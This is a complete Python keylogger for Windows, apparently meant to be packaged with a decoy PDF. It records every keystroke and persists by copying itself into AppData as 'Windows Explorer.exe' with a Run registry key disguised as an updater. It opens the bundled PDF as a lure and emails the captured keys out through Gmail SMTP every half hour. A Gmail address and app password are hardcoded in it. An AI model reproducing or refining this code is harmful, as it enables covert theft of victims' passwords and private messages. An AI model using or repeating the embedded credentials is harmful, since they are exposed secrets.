#!/usr/bin/env python
import pynput.keyboard
import threading
import smtplib
import sys
import os
import shutil
import subprocess


class keylogger:
    
    def __init__(self, time_interval,email,password):
        self.log = "Keylogger Started"
        self.interval = time_interval
        self.email = email
        self.password = password
        self.become_persistent()
        self.open_pdf()

    
    def append_to_log(self, string):
        self.log += string
        
    def process_key_press(self,key):
        try:
            current_key=str(key.char)
        except:
            if key == key.space:
                current_key=" "
            else:
                current_key=" " +   str(key) + " "
        self.append_to_log(current_key)
    
    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call(r'reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WinSysUpdater /t REG_SZ /d "' + evil_file_location + '"',shell=True)
    
    def report(self):
        self.send_mail(self.email, self.password, self.log)
        self.log = "Keyloger timeout \n\n"
        timer = threading.Timer(self.interval, self.report)
        timer.start()
        
    def open_pdf(self):
        filename = os.path.join(sys._MEIPASS, "sample.pdf")
        if os.path.exists(filename):
            subprocess.Popen([filename], shell=True)
        else:
            print("Fayl topilmadi!")

    def send_mail(self,email,password,message):
        server = smtplib.SMTP("smtp.gmail.com", 587)    
        server.starttls()
        server.login(email,password) 
        server.sendmail(email,email,message)
        server.quit()
    
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()   
        

my_keylogger = keylogger(1800,"mustafayevaxmadjon@gmail.com", "dyji ipfw wiuh yaxy")
my_keylogger.start()